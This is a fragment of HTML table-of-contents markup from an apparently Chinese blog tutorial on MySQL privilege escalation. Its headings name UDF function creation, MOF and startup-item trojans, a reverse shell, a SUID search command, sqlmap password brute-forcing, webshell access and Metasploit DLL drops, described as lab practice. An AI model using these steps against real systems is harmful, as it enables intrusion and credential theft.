href="#create-function-do-system-returns-integer-soname-%E2%80%98icepeak-so%E2%80%99-%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0do-system-%E7%B1%BB%E5%9E%8B%E6%98%AFinteger%EF%BC%8C%E5%88%AB%E5%90%8D-soname%E6%96%87%E4%BB%B6%E5%90%8D%E5%AD%97%E7%84%B6%E5%90%8E%E6%9F%A5%E8%AF%A2%E5%87%BD%E6%95%B0%E6%98%AF%E5%90%A6%E5%88%9B%E5%BB%BA%E6%88%90%E5%8A%9F"><span class="toc-number">5.0.1.10.</span> <span class="toc-text">create function do_system returns integer soname ‘icepeak.so’; #(创建自定义函数do_system 类型是integer，别名 soname文件名字然后查询函数是否创建成功)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#select-from-mysql-func"><span class="toc-number">5.0.1.11.</span> <span class="toc-text">select * from mysql.func;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-find-x2F-user-root-perm-4000-print-2-gt-x2F-dev-x2F-null%E6%9F%A5%E7%9C%8BSUID%E6%8F%90%E6%9D%83"><span class="toc-number">5.0.1.12.</span> <span class="toc-text">使用 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null查看SUID提权</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%88%91%E6%98%AF%E5%B0%861518-so%E6%94%BE%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BAwin7%E4%B8%8A%E9%9D%A2%E7%9A%84phpstudy%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%9A%E8%BF%87%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%88%B0-x2F-tmp%E7%9B%AE%E5%BD%95%E6%9D%A5%E6%A8%A1%E6%8B%9F%E7%9C%9F%E5%AE%9E%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%8C%E4%B8%8B%E9%9D%A2%E4%B8%BA%E4%B8%8B%E8%BD%BD%E6%88%90%E5%8A%9F"><span class="toc-number">5.0.1.13.</span> <span class="toc-text">我是将1518.so放在虚拟机win7上面的phpstudy服务器通过远程下载到&#x2F;tmp目录来模拟真实环境下的操作，下面为下载成功</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%B8%AD%E7%9A%84create-function-do-system-returns-integer-soname-%E2%80%981518-so%E2%80%99-%E6%97%B6%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF"><span class="toc-number">5.0.1.14.</span> <span class="toc-text">但是执行文中的create function do_system returns integer soname ‘1518.so’;时出现错误</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E4%BA%86%E6%96%87%E7%AB%A0Qt-Linux-%E8%BF%9EMySQL%E5%87%BA%E7%8E%B0libmysqlclient-so-16%EF%BC%8Cfile-too-short%E9%94%99%E8%AF%AF-kaip-TJU%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AF%E8%83%BD%E6%98%AF%E8%BF%99%E7%A7%8D%E6%96%87%E4%BB%B6%E6%94%BE%E5%9C%A8windows%E4%B8%8A%E4%B8%8D%E5%85%BC%E5%AE%B9%EF%BC%8C%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C%E7%8C%9C%E6%B5%8B%E8%A6%81%E6%94%BE%E5%88%B0linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E4%B8%8B%E8%BD%BD%EF%BC%8C%E8%BF%99%E4%B8%AAso%E6%96%87%E4%BB%B6%E6%98%AF%E5%9C%A8liunx%E7%94%9F%E6%88%90%E7%9A%84%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%B0%86%E5%8E%9F%E6%96%87%E4%BB%B6%E7%9B%B4%E6%8E%A5%E5%A4%8D%E5%88%B6%E5%88%B0%E4%BA%86plugin%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F%E5%A6%82%E4%B8%8B"><span class="toc-number">5.0.1.15.</span> <span class="toc-text">参考了文章Qt Linux 连MySQL出现libmysqlclient.so.16，file too short错误_kaip_TJU的博客-CSDN博客，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%88%9B%E5%BB%BA%E6%88%90%E5%8A%9F"><span class="toc-number">5.0.1.16.</span> <span class="toc-text">函数创建成功</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%90%E5%8F%B7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F"><span class="toc-number">6.</span> <span class="toc-text">#提权条件-数据库帐号密码获取方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E4%B8%80%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%9C%80%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text">条件一：数据库的最高权限用户的密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E4%BA%8C%EF%BC%9Asecure-file-priv%E6%B2%A1%E8%BF%9B%E8%A1%8C%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6"><span class="toc-number">6.2.</span> <span class="toc-text">条件二：secure-file-priv没进行目录限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%BC%80%E5%90%AFsecure-file-priv%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%9B%E5%85%A5MYSQL%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E6%89%93%E5%BC%80my-ini%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%EF%BC%8C%E5%9C%A8%E6%9C%AB%E5%B0%BE%E5%8A%A0%E5%85%A5secure-file-priv-x3D-%EF%BC%8CMysql%E6%B7%BB%E5%8A%A0secure-file-prive%E5%80%BC-%E8%BF%BD%E5%BE%97%E4%B8%8A%E7%9A%84%E6%A2%A6%E6%83%B3-%E5%8D%9A%E5%AE%A2%E5%9B%AD-cnblogs-com-%EF%BC%8C%E4%BD%86%E6%98%AF%E5%89%8D%E6%8F%90%E6%98%AF%E5%8A%A0%E5%85%A5%E5%90%8EMYSQL%E6%9C%8D%E5%8A%A1%E5%BE%97%E9%87%8D%E5%90%AF%E6%89%8D%E6%9C%89%E6%95%88%E6%9E%9C"><span class="toc-number">6.3.</span> <span class="toc-text">如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my.ini文件编辑，在末尾加入secure_file_priv&#x3D;，Mysql添加secure_file_prive值 - 追得上的梦想 - 博客园 (cnblogs.com)，但是前提是加入后MYSQL服务得重启才有效果</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E7%BD%91%E7%AB%99%E5%AD%98%E5%9C%A8%E9%AB%98%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">6.3.1.</span> <span class="toc-text">1、网站存在高权限SQL注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AD%98%E5%82%A8%E6%96%87%E4%BB%B6%E6%88%96%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="toc-number">6.3.2.</span> <span class="toc-text">2、数据库的存储文件或备份文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E7%BD%91%E7%AB%99%E5%BA%94%E7%94%A8%E6%BA%90%E7%A0%81%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">6.3.3.</span> <span class="toc-text">3、网站应用源码中的数据库配置文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E9%87%87%E7%94%A8%E5%B7%A5%E5%85%B7%E6%88%96%E8%84%9A%E6%9C%AC%E7%88%86%E7%A0%B4-%E9%9C%80%E8%A7%A3%E5%86%B3%E5%A4%96%E8%81%94%E9%97%AE%E9%A2%98"><span class="toc-number">6.3.4.</span> <span class="toc-text">4、采用工具或脚本爆破(需解决外联问题)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E7%94%A8sqlmap%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="toc-number">6.3.4.1.</span> <span class="toc-text">如果存在注入点，用sqlmap爆破密码</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E8%8E%B7%E5%8F%96%E4%BA%86%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%EF%BC%8C%E9%80%9A%E8%BF%87%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%BF%99%E5%87%A0%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%AD%EF%BC%8C%E4%B8%80%E8%88%AC%E6%98%AFuser-MYD%E6%96%87%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5"><span class="toc-number">6.3.4.2.</span> <span class="toc-text">如果获取了网站权限，通过数据库的这几个文件中，一般是user.MYD文件，下载下来</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%8CMD5%E7%BD%91%E7%AB%99%E8%A7%A3%E5%AF%86%E5%8D%B3%E5%8F%AF"><span class="toc-number">6.3.4.3.</span> <span class="toc-text">打开这个文件，可以看到加密后的密码，MD5网站解密即可</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%98%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">6.3.4.4.</span> <span class="toc-text">还可以查看配置文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">6.3.4.5.</span> <span class="toc-text">打开就可以看到用户密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MYSQL-UDF-amp-MOF-amp-%E5%90%AF%E5%8A%A8%E9%A1%B9-amp-%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">6.4.</span> <span class="toc-text">#MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">6.5.</span> <span class="toc-text">4种方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%83%BD%E5%BB%BA%E7%AB%8B%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%80%E5%90%AF%E4%BA%86%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9F%E8%83%BD%E4%B8%8A%EF%BC%8C%E5%8D%B3secure-file-priv%E5%BC%80%E5%90%AF"><span class="toc-number">6.6.</span> <span class="toc-text">都建立在数据库开启了写入文件的功能上，即secure-file-priv开启</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%E3%80%81UDF"><span class="toc-number">6.6.1.</span> <span class="toc-text">方法1、UDF</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81-%E5%BC%80%E5%90%AF%E5%A4%96%E8%81%94-%E9%AB%98%E7%89%88%E6%9C%AC%E5%88%9B%E5%BB%BA%E7%9B%AE%E5%BD%95-MSF%E5%AF%BC%E5%87%BAdll-Webshell%E6%89%A7%E8%A1%8C%E5%90%8E%E7%BB%AD"><span class="toc-number">6.6.1.1.</span> <span class="toc-text">获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#mysql-lt-5-2-%E5%AF%BC%E5%87%BA%E7%9B%AE%E5%BD%95c-x2F-windows%E6%88%96system32"><span class="toc-number">6.6.1.2.</span> <span class="toc-text">mysql&lt;5.2 导出目录c:&#x2F;windows或system32</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#mysql-x3D-gt-5-2-%E5%AF%BC%E5%87%BA%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95-x2F-lib-x2F-plugin-x2F"><span class="toc-number">6.6.1.3.</span> <span class="toc-text">mysql&#x3D;&gt;5.2 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8%E5%93%A5%E6%96%AF%E6%8B%89%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%9B%A0%E4%B8%BA%E6%9C%A8%E9%A9%AC%E5%9C%A8%E5%85%B6%E6%9C%AC%E5%9C%B0%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E4%BB%A5%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">6.6.1.4.</span> <span class="toc-text">用哥斯拉连接数据库(因为木马在其本地，所以可以连接数据库)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E5%A4%96%E9%83%A8%E8%BD%AF%E4%BB%B6%E5%B0%9D%E8%AF%95%E8%BF%9E%E6%8E%A5%EF%BC%8C%E4%BC%9A%E6%8B%92%E7%BB%9D%EF%BC%8C%E5%8E%9F%E5%9B%A0%E6%98%AF%E6%B2%A1%E6%9C%89%E5%BC%80%E5%90%AF%E5%A4%96%E8%BF%9E"><span class="toc-number">6.6.1.5.</span> <span class="toc-text">但是外部软件尝试连接，会拒绝，原因是没有开启外连</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%85%88%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">6.6.1.6.</span> <span class="toc-text">先判断数据库的版本</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8sql%E8%AF%AD%E5%8F%A5%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95"><span class="toc-number">6.6.1.7.</span> <span class="toc-text">用sql语句查看安装目录</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E8%BF%9B%E5%85%A5%E8%BF%99%E4%B8%AAlib-x2F-plugin%E7%9B%AE%E5%BD%95-%E6%B2%A1%E6%9C%89%E7%9B%AE%E5%BD%95%E9%87%87%E7%94%A8%E6%89%8B%E5%B7%A5%E5%88%9B%E5%BB%BAplugin-%E7%84%B6%E5%90%8Emsf%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-number">6.6.1.8.</span> <span class="toc-text">然后进入这个lib&#x2F;plugin目录,没有目录采用手工创建plugin,然后msf进行利用</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">6.6.2.</span> <span class="toc-text">利用步骤：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%88MSF-%EF%BC%88%E5%89%8D%E6%8F%90%E5%85%88%E5%BC%80%E5%A4%96%E9%93%BE%EF%BC%89"><span class="toc-number">6.6.3.</span> <span class="toc-text">先MSF:（前提先开外链）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%98%AF%E7%94%A8msf%E5%9C%A8lib-x2F-plugin%E7%9B%AE%E5%BD%95%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90dll%E6%96%87%E4%BB%B6%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%89%8B%E5%B7%A5%E5%88%9B%E5%BB%BAdll%E6%96%87%E4%BB%B6%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.6.3.1.</span> <span class="toc-text">这里是用msf在lib&#x2F;plugin目录自动生成dll文件，也可以手工创建dll文件然后上传</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A5%E7%9D%80Navicat%E5%AE%9E%E7%8E%B0"><span class="toc-number">6.6.4.</span> <span class="toc-text">接着Navicat实现:</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%EF%BC%88%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%93%A5%E6%96%AF%E6%8B%89%E9%87%8C%E9%9D%A2%E6%89%A7%E8%A1%8C%E8%AF%AD%E5%8F%A5%EF%BC%8CNavicat%E5%B1%9E%E4%BA%8E%E5%88%AB%E7%9A%84%E4%B8%BB%E6%9C%BA%EF%BC%8C%E8%A6%81%E5%BC%80%E5%90%AF%E4%BA%86%E5%A4%96%E8%BF%9E%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%89%8D%E8%83%BD%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%89"><span class="toc-number">6.6.4.1.</span> <span class="toc-text">（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E4%B8%8A%E8%BF%B0%EF%BC%9A"><span class="toc-number">6.6.4.2.</span> <span class="toc-text">演示上述：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E6%A8%A1%E5%9D%97%E5%90%8Eshow-options"><span class="toc-number">6.6.4.3.</span> <span class="toc-text">选择模块后show options</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8C%89%E7%85%A7%E5%91%BD%E4%BB%A4%E5%BE%80%E4%B8%8B%E6%95%B2"><span class="toc-number">6.6.4.4.</span> <span class="toc-text">按照命令往下敲</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%99%E9%87%8Crun%E4%B9%8B%E5%89%8D%EF%BC%8C%E8%A6%81%E7%A1%AE%E4%BF%9D%E6%95%B0%E6%8D%AE%E5%BA%93%E6%98%AF%E6%94%AF%E6%8C%81%E5%A4%96%E8%BF%9E%E7%9A%84%EF%BC%8C%E4%B8%8D%E7%84%B6%E6%97%A0%E6%B3%95%E5%88%A9%E7%94%A8%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E5%A4%96%E8%BF%9E%EF%BC%8C%E6%89%93%E5%BC%80%E5%A4%96%E8%BF%9Esql%E8%AF%AD%E5%8F%A5%E5%A6%82%E4%B8%8B"><span class="toc-number">6.6.4.5.</span> <span class="toc-text">这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%AE%8C%E5%90%8E%E5%8F%91%E7%8E%B0%E6%9C%89%E4%B8%AA-%EF%BC%8C%E8%BF%99%E8%A1%A8%E6%98%8E%E4%BB%BB%E6%84%8F%E4%B8%BB%E6%9C%BA%E9%83%BD%E5%8F%AF%E4%BB%A5%E8%BF%9E%E6%8E%A5%E8%BF%99%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">6.6.4.6.</span> <span class="toc-text">执行完后发现有个%，这表明任意主机都可以连接这个数据库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%84%B6%E5%90%8Erun"><span class="toc-number">6.6.4.7.</span> <span class="toc-text">然后run</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%9A%8F%E5%90%8E%E4%BC%9A%E5%9C%A8%E7%9B%AE%E5%BD%95%E4%B8%8B%E4%BA%A7%E7%94%9F%E4%B8%80%E4%B8%AAdll%E6%96%87%E4%BB%B6"><span class="toc-number">6.6.4.8.</span> <span class="toc-text">随后会在目录下产生一个dll文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87sql%E6%9F%A5%E8%AF%A2%E6%89%BE%E5%88%B0sys-exec%E5%92%8C%E8%BF%99%E4%B8%AAdll%E6%96%87%E4%BB%B6%E7%BB%91%E5%AE%9A%E4%BA%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87sys-exec%E6%9D%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">6.6.4.9.</span> <span class="toc-text">也可以通过sql查询找到sys_exec和这个dll文件绑定了，可以通过sys_exec来执行命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E7%94%A8sys-exec%E6%9D%A5-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%BC%9A%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E5%8F%AA%E4%BC%9A%E6%98%BE%E7%A4%BA%E6%95%B0%E5%AD%97"><span class="toc-number">6.6.4.10.</span> <span class="toc-text">但是用sys_exec来 执行命令，会没有回显，只会显示数字</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E7%94%A8Navicat%E5%85%88%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%88%96%E8%80%85%E5%93%A5%E6%96%AF%E6%8B%89%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C-%EF%BC%8C%E5%B0%86%E8%BF%99%E4%B8%AAsys-eval%E4%B9%9F%E7%BB%91%E5%AE%9A%E8%BF%99%E4%B8%AAdll%E6%96%87%E4%BB%B6%EF%BC%8C%E5%9B%A0%E4%B8%BAsys-eval%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">6.6.4.11.</span> <span class="toc-text">所以这里用Navicat先连接数据库(或者哥斯拉直接执行)，将这个sys_eval也绑定这个dll文件，因为sys_eval有回显</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%8E%B0%E5%9C%A8%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%BA%86%E5%B9%B6%E4%B8%94%E6%9C%89%E5%9B%9E%E6%98%BE%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%AE%9E%E7%8E%B0%E8%BF%9C%E6%8E%A7%E4%B8%8A%E7%BA%BF"><span class="toc-number">6.6.4.12.</span> <span class="toc-text">现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%E3%80%81MOF-Win2008%E5%90%8E%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E5%AF%BC%E8%87%B4%E6%97%A0%E6%95%88-MSF%E6%BC%94%E7%A4%BA%EF%BC%88%E6%88%90%E5%8A%9F%E5%87%A0%E7%8E%87%E4%B8%8D%E9%AB%98%EF%BC%89"><span class="toc-number">6.6.5.</span> <span class="toc-text">方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%E3%80%81%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">6.6.6.</span> <span class="toc-text">方法3、启动项</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80%E5%BC%80%E5%A7%8B%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%B8%BA%E7%A9%BA"><span class="toc-number">6.6.6.1.</span> <span class="toc-text">一开始启动目录为空</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%B8%8A%E9%9D%A2%E7%9A%84msf%E5%91%BD%E4%BB%A4%E5%90%8E%E5%9C%A8%E5%90%AF%E5%8A%A8%E9%A1%B9%E7%94%9F%E6%88%90%E4%BA%86%E4%B8%80%E4%B8%AAexe%E6%9C%A8%E9%A9%AC"><span class="toc-number">6.6.6.2.</span> <span class="toc-text">执行上面的msf命令后在启动项生成了一个exe木马</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E4%B8%8B%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%98%AF%E5%90%AF%E5%8A%A8%E9%A1%B9%EF%BC%8C%E6%89%80%E4%BB%A5%E8%A6%81%E5%9C%A8%E5%85%B6%E5%90%AF%E5%8A%A8%E7%9A%84%E6%97%B6%E5%80%99%E6%89%8D%E4%BC%9A%E6%89%A7%E8%A1%8C%E4%B8%8A%E7%BA%BF"><span class="toc-number">6.6.6.3.</span> <span class="toc-text">如下，因为是启动项，所以要在其启动的时候才会执行上线</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%E3%80%81%E5%8F%8D%E5%BC%B9Shell%EF%BC%88%E6%89%8B%E5%8A%A8%E5%88%9B%E5%BB%BAdll%EF%BC%8C%E5%8E%9F%E7%90%86%E5%92%8CUDF%E4%B8%80%E6%A0%B7%EF%BC%8C%E5%8F%AA%E6%98%AF%E5%B0%86%E6%89%A7%E8%A1%8C%E7%9A%84payload%E4%B8%80%E6%AD%A5%E6%AD%A5%E4%BC%A0%E5%8F%82%E6%95%B0%E6%9C%80%E5%90%8E%E7%BB%91%E5%AE%9Adll%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">6.6.7.</span> <span class="toc-text">方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%86%E4%B8%8A%E9%9D%A2%E7%9A%84sql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C"><span class="toc-number">6.6.7.1.</span> <span class="toc-text">将上面的sql语句执行</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E4%B8%8A%E9%9D%A2%E7%9B%91%E5%90%AC7788%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%94%B6%E5%88%B0shell%E5%8F%8D%E5%BC%B9"><span class="toc-number">6.6.7.2.</span> <span class="toc-text">攻击机上面监听7788端口，收到shell反弹</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E7%94%9F%E6%88%90%E4%BA%86udf-dll%E6%96%87%E4%BB%B6"><span class="toc-number">6.6.7.3.</span> <span class="toc-text">可以看到生成了udf.dll文件</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="toc-number">6.6.8.</span> <span class="toc-text">注意：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%93%8D%E4%BD%9C%E9%83%BD%E9%9C%80%E8%A6%81secure-file-priv%E5%BC%80%E5%90%AF%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%AD%90%E5%95%8Amy-ini%E6%96%87%E4%BB%B6%E9%87%8C%E9%9D%A2%E5%B0%86%E5%85%B6%E5%88%A0%E9%99%A4%EF%BC%8C%E5%A6%82%E4%B8%8B"><span class="toc-number">6.6.8.1.</span> <span class="toc-text">上面的操作都需要secure_file_priv开启，如果子啊my.ini文件里面将其删除，如下</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" 